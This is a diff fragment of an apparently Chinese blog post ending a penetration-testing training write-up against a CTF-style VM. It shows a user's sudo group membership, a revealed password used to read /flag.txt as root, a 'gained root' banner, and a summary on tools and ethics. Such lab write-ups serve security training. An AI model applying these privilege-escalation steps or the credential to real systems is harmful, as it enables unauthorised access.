-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bob@Milburg-High:~/Documents$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(bob) gid=1001(bob) <span class="built_in">groups</span>=1001(bob),27(sudo)</span><br></pre></td></tr></table></figure>
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161706416.png" class="" title="image-20240104161706416">
-<img src="/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161832640.png" class="" title="image-20240104161832640">
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /flag.txt</span><br><span class="line">[sudo] password for bob: b0bcat_</span><br><span class="line"></span><br><span class="line">CONGRATS ON GAINING ROOT</span><br><span class="line"></span><br><span class="line">        .-.</span><br><span class="line">       (   )</span><br><span class="line">        |~|       _.--._</span><br><span class="line">        |~|~:&#x27;--~&#x27;      |</span><br><span class="line">        | | :   #root   |</span><br><span class="line">        | | :     _.--._|</span><br><span class="line">        |~|~`&#x27;--~&#x27;</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line">        | |</span><br><span class="line"></span><br><span class="line">   _____|_|_________ Thanks for playing ~c0rruptedb1t</span><br></pre></td></tr></table></figure>
-<h4 id="三、总结-1"><a href="#三、总结-1" class="headerlink" title="三、总结"></a>三、总结</h4><p>通过本次实训，我们全面了解了渗透测试的基本流程和操作方法。从初步的信息收集到最终获取目标主机的控制权，每一步都是为了更深入地理解目标系统的安全漏洞。通过这次实验，不仅加深了对理论知识的理解，还提高了实际操作能力。实训中使用的工具和技术，如<code>Nmap、Nikto、Burp Suite</code>等，是网络安全领域的基石，掌握这些工具对于未来的安全研究和职业生涯至关重要。</p>
-<p>此外，实训也强调了进行渗透测试时的道德和法律责任。所有测试活动都应在合法和道德的范围内进行。总之，本次实训不仅提高了技术技能，也增进了对网络安全重要性的认识。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
 
 </div>
   </main>
